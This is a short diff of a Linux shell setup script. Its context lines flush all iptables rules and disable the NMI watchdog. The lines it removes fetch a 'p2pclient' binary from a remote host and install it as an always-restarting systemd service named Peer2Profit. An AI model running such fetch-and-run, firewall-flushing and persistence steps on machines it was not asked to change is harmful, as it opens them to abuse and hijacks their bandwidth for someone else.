@@ -18,22 +18,3 @@ fi
 echo '0' >/proc/sys/kernel/nmi_watchdog
 echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf
 iptables -F
-
-cd /opt
-wget https://img.zeruns.tech/down/p2pclient
-chmod +x p2pclient
-
-cat >/etc/systemd/system/Peer2Profit.service <<EOL
-[Unit]
-Description=Peer2Profit
-[Service]
-Type=simple
-ExecStart=/opt/p2pclient -l u223110@163.com
-TimeoutSec=15
-Restart=always
-[Install]
-WantedBy=multi-user.target
-EOL
-
-systemctl enable Peer2Profit
-systemctl start Peer2Profit
